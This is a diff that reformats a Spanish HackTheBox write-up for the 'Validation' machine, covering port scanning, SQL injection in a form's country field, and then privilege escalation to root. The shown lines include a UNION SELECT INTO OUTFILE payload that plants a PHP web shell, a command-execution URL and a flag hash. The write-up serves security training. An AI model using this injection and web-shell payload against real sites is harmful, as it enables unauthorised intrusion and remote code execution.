@@ -1,20 +1,10 @@
 # Validation
 
-Plataforma: HackTheBox
-OS: Linux
-Level: Easy
-Status: Done
-Complete: Yes
-EJPT: yes
-Created time: 26 de enero de 2025 20:21
-IP: 10.10.11.116
+Plataforma: HackTheBox OS: Linux Level: Easy Status: Done Complete: Yes EJPT: yes Created time: 26 de enero de 2025 20:21 IP: 10.10.11.116
 
 ## Recopilación de información
 
-<aside>
 💡 Reconocimiento general
-
-</aside>
 
 Que sistema es
 
@@ -28,7 +18,7 @@ whichSystem.py 10.10.11.116
 
 Comenzamos con un escaneo para identificar que puertos están abiertos.
 
----
+***
 
 ```bash
 sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 10.10.11.116 -oG targeted
@@ -44,7 +34,7 @@ PORT     STATE SERVICE    REASON
 
 Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.
 
----
+***
 
 ```bash
 ❯ sudo nmap -p22,80,4566,8080 -sCV 10.10.11.116 -oN targeted
@@ -65,40 +55,37 @@ PORT     STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-- **Identificación de vulnerabilidades**
-    - 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
-    - 80/tcp   open  http    Apache httpd 2.4.48
-    - 4566/tcp open  http    nginx
-    - 8080/tcp open  http    nginx
+* **Identificación de vulnerabilidades**
+  * 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
+  * 80/tcp open http Apache httpd 2.4.48
+  * 4566/tcp open http nginx
+  * 8080/tcp open http nginx
+*   **Enumeración web**
 
-- **Enumeración web**
-    
-    
     Whatweb
-    
+
     ```bash
     whatweb 10.10.11.116
     ❯ whatweb 10.10.11.116
     http://10.10.11.116 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[10.10.11.116], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]
-    
+
     ```
-    
 
 Vemos un formulario web
 
-![image.png](/images/HackTheBox/image.png)
+![image.png](<../../.gitbook/assets/image (1).png>)
 
 En primer lugar, hacemos una captura de la peticion del formulario y observamos dos campos: username y country
 
-Probamos a inyectar una comilla y vemos que salta un error en la web : 
+Probamos a inyectar una comilla y vemos que salta un error en la web :
 
 ```bash
 Brazil’
 ```
 
-![image.png](/images/HackTheBox/837b1a54-af10-481c-a6c8-0bc031312a36.png)
+![image.png](../../.gitbook/assets/837b1a54-af10-481c-a6c8-0bc031312a36.png)
 
-![image.png](/images/HackTheBox/image%201.png)
+![image.png](<../../.gitbook/assets/image 1 (1).png>)
 
 Vemos que el campo es vulnerable. Probamos a ver si cerrando la consulta sigue mostrando error y vemos que no
 
@@ -107,16 +94,13 @@ Vemos que el campo es vulnerable. Probamos a ver si cerrando la consulta sigue m
 username=test&country=Brazil' -- -
 ```
 
-![image.png](/images/HackTheBox/image%202.png)
+![image.png](<../../.gitbook/assets/image 2 (1).png>)
 
 Entonces lo que probamos es a inyectar un payload en la consulta : Explotacion 1
 
 ## Explotación
 
-<aside>
 💡 Probamos diferentes accesos
-
-</aside>
 
 ### Explotación 1
 
@@ -129,7 +113,7 @@ Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE
 
 Accedemos a la pagina y muesta un error
 
-![image.png](/images/HackTheBox/image%203.png)
+![image.png](<../../.gitbook/assets/image 3 (1).png>)
 
 Accedemos ahora a :
 
@@ -137,7 +121,7 @@ Accedemos ahora a :
 http://10.10.11.116/shell.php?cmd=id
 ```
 
-![image.png](/images/HackTheBox/image%204.png)
+![image.png](<../../.gitbook/assets/image 4 (1).png>)
 
 Obtenemos RCE
 
@@ -182,10 +166,7 @@ c7080c211cb057271c11a2a99e353cfc
 
 ### Explotación posterior
 
-<aside>
 💡 Accedemos con las credenciales encontradas
-
-</aside>
 
 ### Escalada de privilegios
 
@@ -218,7 +199,4 @@ root@validation:~#                                                              
 
 ## Conclusión
 
-<aside>
 💡 Maquina que he tenido que mirar wrtite up pues no sabia como continuar. He empezado usando SQLMap y me he estancado con ello.
-
-</aside>
